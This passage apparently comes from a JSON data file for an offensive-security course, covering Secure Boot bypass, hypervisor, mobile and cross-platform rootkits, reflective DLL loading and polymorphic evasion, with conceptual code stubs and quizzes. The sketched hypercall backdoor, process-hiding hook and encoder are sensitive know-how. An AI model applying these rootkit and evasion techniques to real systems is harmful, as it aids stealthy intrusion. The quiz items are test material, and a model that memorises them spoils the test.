                "title": "UEFI Secure Boot Bypass",
                "duration": "100 min",
                "objectives": [
                    "Perform a detailed analysis of the Secure Boot chain of trust.",
                    "Identify and exploit vulnerabilities in the key exchange and signature verification process.",
                    "Exploit vulnerabilities in signed bootloaders to bypass Secure Boot.",
                    "Analyze the role and potential weaknesses of the 'shim' bootloader.",
                    "Discuss attacks against the underlying Hardware Security Module (HSM) or TPM."
                ],
                "content": {
                    "overview": "Secure Boot is the primary defense against UEFI bootkits, creating a cryptographic chain of trust from the firmware to the kernel. This lesson explores the advanced research into bypassing this critical security feature, looking for logical flaws and implementation bugs in the bootloaders and signature verification processes that can be exploited to break the chain.",
                "sections": [
                    {
                        "title": "Secure Boot Chain Analysis",
                        "content": "<p>Secure Boot is not a single feature; it's a process. It relies on a chain of trust. Each component in the boot process is responsible for cryptographically verifying the integrity of the *next* component before executing it.</p><h3>The Chain:</h3><ol><li>The UEFI firmware (which is implicitly trusted) verifies the signature of the OS bootloader.</li><li>The OS bootloader verifies the signature of the OS kernel.</li><li>The OS kernel verifies the signature of all loaded drivers.</li></ol><p>A vulnerability in *any link* in this chain can compromise the entire process.</p>",
                            "image": "https://images.unsplash.com/photo-1593435713588-a73de23947db?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Bootloader Exploitation",
                            "content": "<p>The OS bootloader (like the Windows `bootmgfw.efi` or the Linux `grubx64.efi`) is a complex program in its own right, and it can have vulnerabilities. Since the bootloader is signed by a trusted authority (like Microsoft) and is executed by the firmware, a vulnerability in the bootloader itself is a prime target for a Secure Boot bypass.</p><p><strong>Real-world Example: The 'BlackLotus' Bootkit.</strong> BlackLotus was the first major, in-the-wild bootkit that could bypass UEFI Secure Boot. It exploited a known vulnerability (CVE-2022-21894) in several legitimate, signed Windows bootloaders. The attackers would drop one of these vulnerable, but signed, bootloaders onto the EFI System Partition and modify the boot configuration to load it. Because it was legitimately signed by Microsoft, Secure Boot would allow it to run. The attackers could then exploit the vulnerability within that bootloader to disable security policies and load their own unsigned, malicious bootkit drivers, completely defeating the purpose of Secure Boot.</p>",
                            "image": "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Shim and Hardware Security Bypass",
                            "content": "<p>In the Linux world, the 'shim' is a small, pre-bootloader that is signed by Microsoft. Its only job is to verify and then execute the main, community-signed bootloader (like GRUB). A vulnerability in the shim itself can be another vector for a Secure Boot bypass.</p><p>The most advanced attacks would target the underlying hardware that stores the keys, such as the Trusted Platform Module (TPM), but these attacks are extremely difficult and often require physical access and sophisticated hardware hacking skills.</p>",
                            "image": "https://images.unsplash.com/photo-1548092372-2d987bde898b?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Secure Boot Analysis (UEFI Tool)",
                            "language": "bash",
                            "code": "# This command uses the 'efi-readvar' tool on Linux to display the UEFI variables\n# that control the Secure Boot process.\n\n# List the Platform Key (PK)\nefi-readvar -v PK\n\n# List the Key Exchange Keys (KEK)\nefi-readvar -v KEK\n\n# List the signature database (db) - the list of allowed signatures\nefi-readvar -v db\n\n# List the forbidden signature database (dbx) - the list of revoked signatures\nefi-readvar -v dbx\n\n# By analyzing these variables, a researcher can understand the trust anchors\n# for the Secure Boot process on a specific machine. An attack might involve\n# finding a way to maliciously update these variables to add the attacker's own key."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the fundamental principle of UEFI Secure Boot?",
                            "options": [
                                "It encrypts the entire hard drive.",
                                "It creates a cryptographic chain of trust, where each component in the boot process verifies the digital signature of the next component before executing it.",
                                "It scans the memory for viruses during the boot process.",
                                "It requires the user to enter a password every time the computer boots."
                            ],
                            "correct": 1,
                            "explanation": "The chain of trust is the core concept. It's designed to ensure that from the moment the power is turned on, only authentic, untampered code is ever allowed to execute."
                        },
                        {
                            "id": 2,
                            "question": "The BlackLotus bootkit was able to bypass Secure Boot by what method?",
                            "options": [
                                "By disabling the UEFI firmware.",
                                "By guessing the administrator's password.",
                                "By exploiting a vulnerability in a legitimate, signed Windows bootloader that Secure Boot would allow to run.",
                                "By infecting the Master Boot Record."
                            ],
                            "correct": 2,
                            "explanation": "This is a classic bypass technique. The attacker finds a vulnerability in a file that is already trusted and signed. They can then use that trusted file as a 'Trojan horse' to get their code running in an environment where unsigned code would normally be blocked."
                        },
                        {
                            "id": 3,
                            "question": "The database of revoked or known-bad signatures that Secure Boot will refuse to execute is known as the:",
                            "options": [
                                "KEK",
                                "PK",
                                "db",
                                "dbx"
                            ],
                            "correct": 3,
                            "explanation": "The 'dbx' is the forbidden signature database. It acts as a blocklist. When a bootloader is found to be vulnerable (like in the BlackLotus case), Microsoft can issue an update to the dbx to prevent that specific bootloader from being allowed to run in the future."
                        }
                    ]
                }
            },
            {
                "id": "lesson-24",
                "title": "Hypervisor Rootkit Development",
                "duration": "100 min",
                "objectives": [
                    "Design the architecture for a hypervisor-based rootkit.",
                    "Bypass Hypervisor-Protected Code Integrity (HVCI).",
                    "Develop techniques to evade virtual machine introspection.",
                    "Create a covert communication channel from a hypervisor.",
                    "Exploit nested virtualization for advanced attacks."
                ],
                "content": {
                    "overview": "This lesson covers the development of the most powerful class of software rootkit: the hypervisor rootkit. By taking control of the hardware virtualization features of the CPU, this type of rootkit can run at a privilege level even higher than the OS kernel, making it completely transparent and nearly undetectable to the compromised operating system.",
                "sections": [
                    {
                        "title": "Hypervisor-Based Malware Architecture",
                        "content": "<p>A hypervisor rootkit, sometimes called a 'Blue Pill' after the famous proof-of-concept, works by taking a running operating system and 'lifting' it into a virtual machine that the rootkit controls.</p><h3>The Infection Process:</h3><ol><li>The rootkit gains initial execution in the kernel (e.g., by loading as a standard driver).</li><li>It activates the CPU's virtualization features (Intel VT-x or AMD-V).</li><li>It sets itself up as the hypervisor (running in VMX root mode).</li><li>It creates a virtual machine and places the *entire original operating system* inside of it to run as a guest.</li></ol><p>From this point on, the legitimate OS thinks it is running on bare metal, but it is actually inside a virtual machine controlled by the rootkit. The rootkit now has complete control over the guest's view of memory and hardware.</p>",
                            "image": "https://images.unsplash.com/photo-1593435713588-a73de23947db?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "HVCI Bypass and Introspection Evasion",
                            "content": "<p>Hypervisor-Protected Code Integrity (HVCI) uses the hypervisor to protect the guest kernel. A rootkit that *is* the hypervisor can simply disable these protections for its own malicious code.</p><p>Virtual Machine Introspection (VMI) is a defensive technique that uses the hypervisor to monitor the guest for signs of compromise. A hypervisor rootkit must evade VMI. It can do this by detecting the VMI's attempts to read memory and feeding it clean, fake data instead of the real, malicious data.</p>",
                            "image": "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Hypervisor Communication Channels",
                            "content": "<p>A hypervisor rootkit needs a way to communicate, but it cannot use the guest OS's network stack, as that would be visible. Instead, it must use a covert channel that interacts directly with the physical hardware.</p><p><strong>Real-world Example:</strong> A hypervisor rootkit needs to exfiltrate data. It can take direct control of the physical network card. It can craft its own raw Ethernet frames and place them directly into the network card's transmit buffer, completely bypassing the guest OS's entire network stack. The guest OS will have no record of these packets ever being sent, making the communication completely invisible from within the compromised system.</p>",
                            "image": "https://images.unsplash.com/photo-1548092372-2d987bde898b?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Hypercall Interface Development (Conceptual)",
                            "language": "c",
                            "code": "// A hypercall is how a guest OS can request a service from its hypervisor.\n// A hypervisor rootkit can create a secret hypercall interface for C&C.\n\n// --- Code in the Hypervisor (Rootkit) ---\nvoid HandleVmcall(GUEST_CPU_STATE* guest_state) {\n    // The guest puts the command code in a register, e.g., RAX.\n    UINT64 command_code = guest_state->rax;\n\n    if (command_code == 0xDEADC0DE) { // Our secret command code\n        // The guest put a pointer to a command string in another register, e.g., RCX.\n        char* command_string = guest_state->rcx;\n        // Execute the command from the hypervisor.\n        ExecuteSecretCommand(command_string);\n    }\n}\n\n// --- Code in the User-Mode C&C Agent (in the Guest) ---\nvoid SendCommandToHypervisor(char* command) {\n    // The user-mode agent uses the special 'vmcall' assembly instruction to trap\n    // execution to the hypervisor, passing the command.\n    __asm__(\n        \"mov rax, 0xDEADC0DE\\n\"\n        \"mov rcx, [command]\\n\"\n        \"vmcall\\n\"\n    );\n}"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "A hypervisor rootkit runs at a privilege level often referred to as:",
                            "options": [
                                "Ring 3 (User Mode)",
                                "Ring 0 (Kernel Mode)",
                                "Ring -1 (VMX Root Mode)",
                                "Ring 4"
                            ],
                            "correct": 2,
                            "explanation": "Hardware virtualization creates a new execution mode that is even more privileged than the kernel. The hypervisor runs in this 'root mode', while the guest OS runs in a 'non-root mode', allowing the hypervisor to have complete control."
                        },
                        {
                            "id": 2,
                            "question": "The technique of using the hypervisor to mark a page of guest memory as non-executable, causing a trap to the hypervisor when the guest tries to run code there, is a way to implement what?",
                            "options": [
                                "A covert communication channel.",
                                "A stealthy, EPT-based hook.",
                                "A DKOM attack.",
                                "A user-mode rootkit."
                            ],
                            "correct": 1,
                            "explanation": "Manipulating the Extended Page Tables (EPT) is the core mechanism that a hypervisor uses to control a guest's memory. A hypervisor rootkit can abuse this to create hooks that are completely transparent to the guest OS."
                        },
                        {
                            "id": 3,
                            "question": "What is the primary goal of a hypervisor rootkit like the 'Blue Pill' proof-of-concept?",
                            "options": [
                                "To encrypt the guest's hard drive.",
                                "To take a running operating system and transparently place it inside a virtual machine that the rootkit controls.",
                                "To launch a DDoS attack.",
                                "To steal the user's password."
                            ],
                            "correct": 1,
                            "explanation": "The 'blue pill' concept is about creating an illusion. The rootkit becomes the hypervisor and makes the real OS its 'guest', giving the rootkit ultimate control in a way that is incredibly difficult for the guest OS to detect."
                        }
                    ]
                }
            },
            {
                "id": "lesson-25",
                "title": "Advanced Payload Techniques",
                "duration": "100 min",
                "objectives": [
                    "Develop a reflective DLL loader.",
                    "Create fully position-independent shellcode.",
                    "Design and build stageless payloads.",
                    "Implement runtime payload encryption and decryption.",
                    "Use runtime code generation to create dynamic payloads."
                ],
                "content": {
                    "overview": "This lesson focuses on the art of crafting advanced payloads. We will move beyond simple shellcode to the sophisticated techniques used by modern malware to load and execute their code in memory in a way that is stealthy, flexible, and evades common security defenses.",
                "sections": [
                    {
                        "title": "Reflective DLL Loading",
                        "content": "<p>Standard DLL injection relies on calling the `LoadLibrary` Windows API. This is a well-known and heavily monitored function. Reflective DLL injection is a technique that allows an attacker to load a DLL into a process's memory *without* using `LoadLibrary`.</p><h3>The Process:</h3><ol><li>The attacker's shellcode reads the raw bytes of their malicious DLL into memory.</li><li>The shellcode then acts like a miniature version of the Windows PE loader. It manually parses the DLL's headers, resolves its imports, and performs all the necessary relocations to make it runnable in its new memory location.</li><li>Finally, it calls the DLL's entry point (`DllMain`).</li></ol><p>This is much stealthier because it never calls the suspicious `LoadLibrary` API and the DLL never has to touch the disk of the victim machine.</p>",
                            "image": "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Stageless Payload Development",
                            "content": "<p>As discussed, many exploits use a small 'stager' to download a larger second stage. This has a drawback: the second-stage download creates network traffic that can be detected.</p><p>A **stageless payload** contains all of its functionality in a single, large piece of shellcode. It does not need to download a second stage. While this makes the initial exploit payload larger and more difficult to fit into some vulnerabilities, it is much stealthier on the network as it does not create the suspicious second connection.</p>",
                            "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Runtime Payload Generation",
                            "content": "<p>The most advanced payloads are not static; they are dynamically generated at runtime.</p><p><strong>Real-world Example: Cobalt Strike's Malleable C2.</strong> Cobalt Strike is a professional adversary simulation tool. Its 'Malleable C2' feature allows an operator to create a profile that defines exactly what their C2 traffic should look like. The operator can create a profile that makes their traffic perfectly mimic legitimate Amazon web traffic, or the traffic of a popular online game. The Cobalt Strike framework then uses this profile to dynamically generate a beacon payload that is configured to use exactly those traffic patterns. This makes the C2 traffic extremely difficult to distinguish from legitimate traffic on the network.</p>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Reflective DLL Implementation (Conceptual)",
                            "language": "c",
                            "code": "// This is conceptual C++ code for the loader part of a reflective DLL injection.\n\n// The 'loader' is a piece of shellcode.\nvoid ReflectiveLoader() {\n    // 1. Find our own location in memory.\n    //    This is often done by calling a function and then getting the return address from the stack.\n    void* p_dll_base = FindMyBaseAddress();\n\n    // 2. Parse our own PE header to find the necessary directories (Import, Relocation, etc.).\n    PIMAGE_NT_HEADERS p_nt_headers = GetNtHeaders(p_dll_base);\n\n    // 3. Manually resolve all of our DLL's imports.\n    //    Loop through the Import Directory, call LoadLibrary for each needed DLL,\n    //    and GetProcAddress for each needed function, and write the addresses into our IAT.\n    ResolveImports(p_dll_base);\n\n    // 4. Manually perform any necessary relocations.\n    //    If our DLL was not loaded at its preferred base address, we must fix up\n    //    any hardcoded addresses in our code.\n    PerformRelocations(p_dll_base);\n\n    // 5. Call our DLL's actual entry point (DllMain).\n    DllMain(p_dll_base, DLL_PROCESS_ATTACH, NULL);\n}"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the primary advantage of Reflective DLL Injection?",
                            "options": [
                                "It is easier to write than a standard DLL.",
                                "It allows a DLL to be loaded into a process's memory without ever calling the suspicious `LoadLibrary` API, making it much stealthier.",
                                "It only works on Linux.",
                                "It makes the DLL smaller."
                            ],
                            "correct": 1,
                            "explanation": "Reflective DLL Injection is a key fileless technique. By implementing its own miniature PE loader in shellcode, it can bypass the API hooks that EDRs place on `LoadLibrary`, making the injection much harder to detect."
                        },
                        {
                            "id": 2,
                            "question": "What is the main difference between a 'staged' and a 'stageless' payload?",
                            "options": [
                                "There is no difference.",
                                "A staged payload is small and downloads a second stage from the network, while a stageless payload contains all of its functionality in a single package and makes no second connection.",
                                "Stageless payloads are always smaller.",
                                "Staged payloads are less reliable."
                            ],
                            "correct": 1,
                            "explanation": "This is a trade-off. Staged payloads are smaller and more flexible but create detectable network traffic. Stageless payloads are much stealthier on the network but are larger and less flexible."
                        },
                        {
                            "id": 3,
                            "question": "The 'Malleable C2' feature of a tool like Cobalt Strike allows an operator to do what?",
                            "options": [
                                "To find new vulnerabilities.",
                                "To create a custom profile that defines exactly what the C2 traffic should look like, often to mimic legitimate traffic.",
                                "To automatically write an incident response report.",
                                "To bypass Secure Boot."
                            ],
                            "correct": 1,
                            "explanation": "Malleable C2 is a powerful evasion feature. It allows an operator to dynamically generate a payload whose network traffic is designed to blend in perfectly with the normal traffic of the target environment, making it extremely difficult for network security tools to detect."
                        }
                    ]
                }
            },
        {
            "id": "lesson-26",
            "title": "Evasion and Polymorphism",
            "duration": "100 min",
            "objectives": [
                "Develop a basic polymorphic engine to change a payload's signature.",
                "Implement metamorphic techniques to rewrite code structure.",
                "Use code cave injection to hide a payload inside a legitimate binary.",
                "Research and develop a custom binary packer.",
                "Implement a suite of anti-analysis countermeasures in a rootkit."
            ],
            "content": {
                "overview": "This lesson is a deep dive into the art of evasion. We will explore the advanced techniques that malware and rootkits use to change their form and hide from signature-based detection. You will learn to build your own polymorphic and metamorphic engines and develop a custom packer to protect your code from static analysis.",
                "sections": [
                    {
                        "title": "Polymorphic Engine Development",
                        "content": "<p>A polymorphic engine is a piece of code that takes a payload and creates an encrypted version of it with a unique, randomly generated decryptor stub. No two outputs are ever the same, thus evading simple signature-based detection.</p><h3>The Process:</h3><ol><li><strong>Encryption:</strong> The original payload (the 'body') is encrypted with a randomly generated key. A simple XOR cipher is often used.</li><li><strong>Decoder Generation:</strong> The engine dynamically generates the assembly code for a small 'decoder' stub. This stub will contain the random key and the logic to decrypt the body in memory. To make the decoder unique each time, the engine can use different instruction sequences that have the same effect (e.g., `xor eax, eax` vs. `mov eax, 0`).</li><li><strong>Assembly:</strong> The engine assembles the decoder stub and appends the encrypted payload to it.</li></ol>",
                        "image": "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Metamorphic Code Transformation",
                        "content": "<p>Metamorphism is a step beyond polymorphism. A metamorphic engine doesn't just encrypt a static payload; it completely rewrites the payload's code with each iteration. It is a 'compiler on the fly'.</p><h3>Techniques:</h3><ul><li><strong>Instruction Substitution:</strong> Replacing an instruction with an equivalent one (e.g., `sub eax, 10` becomes `add eax, -10`).</li><li><strong>Code Transposition:</strong> Reordering the functions and basic blocks of the code.</li><li><strong>Junk Code Insertion:</strong> Inserting garbage instructions that do not affect the program's logic but completely change its signature.</li></ul><p>True metamorphic engines are extremely complex to write and are a hallmark of highly advanced malware.</p>",
                        "image": "https://images.unsplash.com/photo-1548092372-2d987bde898b?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Code Cave Injection",
                        "content": "<p>A 'code cave' is a section of null bytes (padding) that often exists inside a legitimate executable file. Compilers will often pad the sections of a binary to align them on a memory boundary.</p><p><strong>Real-world Example:</strong> An attacker can find a large code cave inside a trusted, signed executable (like `explorer.exe`). They can then inject their malicious shellcode into this cave and patch the original program's entry point to first jump to their shellcode. When the program runs, their malicious code runs first, and then it jumps back to the program's original entry point to let it run normally. This allows the attacker to 'trojanize' a legitimate, signed file without changing its size, making it a very stealthy persistence and evasion technique.</p>",
                            "image": "https://images.unsplash.com/photo-1504384308090-c894fdcc538d?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Polymorphic Engine Implementation (Conceptual)",
                            "language": "python",
                            "code": "import random\n\n# This conceptual script demonstrates the logic of a simple polymorphic encoder.\n\ndef polymorphic_xor_encoder(shellcode):\n    \"\"\"Encodes a payload with a random XOR key and generates a unique decoder.\"\"\"\n    \n    key = random.randint(1, 255)\n    encoded_shellcode = bytes([b ^ key for b in shellcode])\n\n    # Dynamically generate the decoder stub\n    # We can randomize the registers used to make it more polymorphic.\n    reg1 = random.choice(['eax', 'ebx', 'ecx', 'edx'])\n    decoder_asm = f\"\"\"\n        xor {reg1}, {reg1}\n        mov {reg1[1]}l, {hex(key)} ; Load the key\n        ; ... code to find the payload and loop ...\n    \"\"\"\n    # A real implementation would assemble this ASM to machine code.\n    # decoder_bytes = assemble(decoder_asm)\n    # return decoder_bytes + encoded_shellcode\n    return f\"Generated decoder with key {hex(key)} and register {reg1}.\""
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "Malware that encrypts its static payload with a different key for each infection and generates a new, unique decryptor stub each time is known as:",
                            "options": [
                                "Metamorphic",
                                "Polymorphic",
                                "A worm",
                                "A rootkit"
                            ],
                            "correct": 1,
                            "explanation": "Polymorphism is an evasion technique focused on changing the malware's on-disk signature to defeat simple antivirus scanning. The core functionality remains the same, but the decryptor and encryption are always unique."
                        },
                        {
                            "id": 2,
                            "question": "A section of null-byte padding inside a legitimate executable file that an attacker can inject their code into is called a:",
                            "options": [
                                "Code cave",
                                "Code segment",
                                "Data segment",
                                "Resource section"
                            ],
                            "correct": 0,
                            "explanation": "Code caves are a common feature of PE/ELF files. Injecting code into a cave is a powerful technique for creating a trojanized version of a trusted, signed file."
                        },
                        {
                            "id": 3,
                            "question": "What is the key difference between polymorphic and metamorphic malware?",
                            "options": [
                                "There is no difference.",
                                "Polymorphic malware encrypts a static body with a changing decryptor, while metamorphic malware completely rewrites its own code with each infection.",
                                "Metamorphic malware is easier to detect.",
                                "Polymorphic malware only infects mobile devices."
                            ],
                            "correct": 1,
                            "explanation": "Metamorphism is a more advanced technique. A polymorphic sample has a common, static 'core' that is just encrypted differently each time. A metamorphic sample has no such static core, making signature-based detection practically impossible."
                        }
                    ]
                }
            },
            {
                "id": "lesson-27",
                "title": "Mobile Rootkit Development",
                "duration": "100 min",
                "objectives": [
                    "Understand the challenges of developing rootkits for Android.",
                    "Explore the connection between jailbreaking and iOS rootkit development.",
                    "Analyze the ARM architecture and its implications for kernel exploitation.",
                    "Develop rootkit techniques for process hiding and communication interception on mobile devices.",
                    "Establish persistence on mobile platforms."
                ],
                "content": {
                    "overview": "This lesson explores the highly specialized and challenging world of mobile rootkit development. We will examine the unique security architectures of Android and iOS, the implications of the ARM architecture, and the techniques required to gain persistent, privileged access to the world's most personal computing devices.",
                    "sections": [
                        {
                            "title": "Android Rootkit Development",
                            "content": "<p>Because Android is based on the Linux kernel, the principles of rootkit development are similar, but the context is different.</p><h3>The Goal: Rooting</h3><p>A 'rootkit' in the Android world is often the tool used to 'root' the device, which means gaining permanent root-level privileges. This is typically achieved by exploiting a vulnerability in the kernel or a privileged process to gain temporary root, and then using that access to install a tool like `su` to make that access permanent.</p><h3>Challenges:</h3><ul><li><strong>Diverse Hardware and Kernels:</strong> There are thousands of different Android devices, each with a slightly different kernel version and hardware configuration, making it difficult to write a universal exploit.</li><li><strong>Security Mitigations:</strong> Modern Android includes many security features like SELinux, verified boot, and exploit mitigations that make rooting much more difficult than it used to be.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1610465213254-2c35a8276b4a?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "iOS Jailbreaking and Exploitation",
                            "content": "<p>On iOS, a 'jailbreak' is the process of bypassing Apple's security restrictions to allow the running of unsigned code. A jailbreak is essentially a user-space rootkit that patches the kernel in memory to disable code signing requirements.</p><p>Developing a jailbreak for a modern, fully-patched iPhone is one of the most difficult tasks in all of offensive security. It typically requires chaining multiple, powerful zero-day vulnerabilities, including a browser exploit to get initial code execution and a kernel exploit to get root privileges and bypass all the hardware-level security mitigations.</p>",
                            "image": "https://images.unsplash.com/photo-1585255428357-ac758950454a?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "ARM-Based Rootkit Techniques",
                            "content": "<p>Mobile devices run on ARM architecture, which has some key differences from x86.</p><p><strong>Real-world Example: Mobile process hiding.</strong> The principles are the same as on Linux x86. The rootkit needs to find the kernel's list of `task_structs` and unlink its own process. However, the specific assembly instructions, the layout of the `task_struct`, and the memory addresses will all be different on ARM. A researcher must use an ARM-compatible debugger and disassembler and have a deep understanding of the ARM architecture to successfully develop a mobile kernel rootkit.</p>",
                            "image": "https://images.unsplash.com/photo-1533139143976-3d235835932c?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Android Kernel Module Rootkit (Conceptual)",
                            "language": "c",
                            "code": "#include <linux/init.h>\n#include <linux/module.h>\n#include <linux/kernel.h>\n#include <linux/sched.h>\n\n// This is a highly conceptual LKM for an Android (Linux) kernel.\n// It demonstrates the logic of hiding a process by its name.\n\nchar* process_to_hide = \"com.malware.app\";\n\n// This rootkit would need to hook the VFS functions that are used to read\n// the /proc directory, which is how the 'ps' command gets its process list.\n\n// A pointer to the original function\nstatic int (*original_proc_filldir)(struct file *, void *, filldir_t);\n\n// Our malicious replacement function\nstatic int hooked_proc_filldir(struct file *file, void *dirent, filldir_t filldir) {\n    // ... (code to get the process name from the directory entry) ...\n\n    // If the process name matches the one we want to hide, we just return 0\n    // without calling the real filldir function. This effectively skips it.\n    if (strstr(process_name, process_to_hide) != NULL) {\n        return 0;\n    }\n\n    // Otherwise, call the original function to let it behave normally.\n    return original_proc_filldir(file, dirent, filldir);\n}\n\n// The init function would perform the hook by finding and overwriting the\n// function pointer in the file_operations struct for the /proc directory."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "The process of bypassing security restrictions on an iOS device to allow the running of unsigned code is known as:",
                            "options": [
                                "Rooting",
                                "Sideloading",
                                "Jailbreaking",
                                "Unlocking"
                            ],
                            "correct": 2,
                            "explanation": "A jailbreak is an exploit chain that defeats the core security mechanisms of iOS. 'Rooting' is the equivalent term for Android."
                        },
                        {
                            "id": 2,
                            "question": "What is the primary CPU architecture used in mobile devices?",
                            "options": [
                                "x86",
                                "x64",
                                "ARM",
                                "SPARC"
                            ],
                            "correct": 2,
                            "explanation": "ARM is a RISC (Reduced Instruction Set Computer) architecture that is highly optimized for low power consumption, making it the standard for virtually all smartphones and tablets."
                        },
                        {
                            "id": 3,
                            "question": "Why is developing a rootkit for Android a different challenge than for a standard Linux desktop?",
                            "options": [
                                "There is no difference.",
                                "Because of the massive diversity of hardware and customized kernel versions across thousands of different Android devices.",
                                "Because Android does not run on the Linux kernel.",
                                "Because Android devices have no memory."
                            ],
                            "correct": 1,
                            "explanation": "The Android ecosystem is highly fragmented. A kernel exploit that works on one specific model of phone with one specific version of Android will likely not work on any other, making the development of a 'universal' rootkit extremely difficult."
                        }
                    ]
                }
            },
            {
                "id": "lesson-28",
                "title": "Cross-Platform Rootkit Techniques",
                "duration": "90 min",
                "objectives": [
                    "Design the architecture for a multi-OS rootkit.",
                    "Develop a cross-platform persistence mechanism.",
                    "Implement a universal hooking mechanism that can adapt to different OSes.",
                    "Create a platform abstraction layer to simplify development.",
                    "Design a unified C&C protocol for a multi-platform botnet."
                ],
                "content": {
                    "overview": "Why write three different rootkits when you can write one that works on Windows, Linux, and macOS? This lesson explores the advanced software engineering required to build a cross-platform rootkit. We will focus on creating abstraction layers and developing universal techniques that can be adapted to the specific internals of each operating system.",
                "sections": [
                    {
                        "title": "Cross-Platform Architecture",
                        "content": "<p>A cross-platform rootkit is designed with a modular architecture.</p><h3>The Components:</h3><ul><li><strong>Core Agent:</strong> The high-level logic of the rootkit, written in a portable language like C++. This code is the same for all platforms.</li><li><strong>Platform Abstraction Layer (PAL):</strong> A set of interfaces that define generic functions like `hide_process()` or `hook_function()`.</li><li><strong>Platform-Specific Modules:</strong> This is where the OS-specific code lives. There is a separate module for Windows, Linux, and macOS. Each of these modules implements the functions defined in the PAL using the specific, low-level techniques for that OS (e.g., the Windows module uses DKOM for `hide_process`, while the Linux module manipulates the `task_struct` list).</li></ul>",
                            "image": "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Universal Hooking and Persistence",
                            "content": "<p>While the low-level implementation is different, the high-level concepts can be universal.</p><p><strong>Real-world Example: Universal Persistence.</strong> The core agent has a function called `establish_persistence()`. The PAL defines this interface. On Windows, the platform-specific module implements this by creating a `Run` key in the Registry. On Linux, the module implements it by creating a systemd service. On macOS, the module implements it by creating a Launch Agent. The core logic is the same ('run this program at startup'), but the implementation is tailored to each OS, allowing the developer to write their main code once.</p>",
                            "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Unified C&C Protocols",
                            "content": "<p>The C&C protocol is designed to be universal. The rootkit on each platform will communicate with the same C2 server, using the same protocol. The C2 server can send a high-level command like `EXECUTE_COMMAND`, and the platform-specific module on each OS is responsible for translating that into the correct action (e.g., running `CreateProcess` on Windows, or `fork`/`execve` on Linux).</p>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Platform Abstraction Implementation (Conceptual C++)",
                            "language": "cpp",
                            "code": "// This conceptual C++ code demonstrates a Platform Abstraction Layer (PAL).\n\n// --- pal.h (The common header file) ---\n\n// The abstract interface that the core agent uses.\nclass IPlatform {\npublic:\n    virtual bool HideProcess(int pid) = 0;\n};\n\n// --- pal_windows.cpp (The Windows-specific implementation) ---\n\nclass WindowsPlatform : public IPlatform {\npublic:\n    bool HideProcess(int pid) override {\n        // Implement process hiding using Windows-specific DKOM techniques\n        // by unlinking the EPROCESS block.\n        // ...\n        return true;\n    }\n};\n\n// --- pal_linux.cpp (The Linux-specific implementation) ---\n\nclass LinuxPlatform : public IPlatform {\npublic:\n    bool HideProcess(int pid) override {\n        // Implement process hiding using Linux-specific DKOM techniques\n        // by unlinking the task_struct from the list.\n        // ...\n        return true;\n    }\n};\n\n// --- core_agent.cpp (The main, cross-platform code) ---\n\nIPlatform* g_platform_api;\n\nint main() {\n    // At startup, the agent determines the OS and creates the correct platform object.\n#if defined(_WIN32)\n    g_platform_api = new WindowsPlatform();\n#elif defined(__linux__)\n    g_platform_api = new LinuxPlatform();\n#endif\n\n    // The core agent can now call the abstracted function without caring about the OS.\n    g_platform_api->HideProcess(1234);\n}"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "In a cross-platform rootkit, what is the purpose of a Platform Abstraction Layer (PAL)?",
                            "options": [
                                "To make the rootkit larger.",
                                "To provide a generic interface that separates the core, platform-agnostic logic from the OS-specific implementation details.",
                                "To make the rootkit only work on Windows.",
                                "To encrypt the rootkit's communications."
                            ],
                            "correct": 1,
                            "explanation": "A PAL is a standard software engineering pattern. It is the key to writing portable code. The main program is written to the abstract PAL interface, and separate modules are created to implement that interface for each target platform."
                        },
                        {
                            "id": 2,
                            "question": "What is the primary motivation for an attacker to develop a cross-platform rootkit?",
                            "options": [
                                "It is easier than writing a single-platform rootkit.",
                                "It allows them to use the same malware to target a wider variety of systems (Windows, macOS, Linux), increasing their operational efficiency.",
                                "It is a requirement for all modern malware.",
                                "Cross-platform rootkits are less likely to be detected."
                            ],
                            "correct": 1,
                            "explanation": "Efficiency is the main driver. By writing their core logic once and only needing to implement a small, platform-specific layer for each OS, an attacker can get a much better return on their development investment."
                        },
                        {
                            "id": 3,
                            "question": "The core logic of a cross-platform rootkit is typically written in a portable, high-level language like:",
                            "options": [
                                "Bash",
                                "PowerShell",
                                "C or C++",
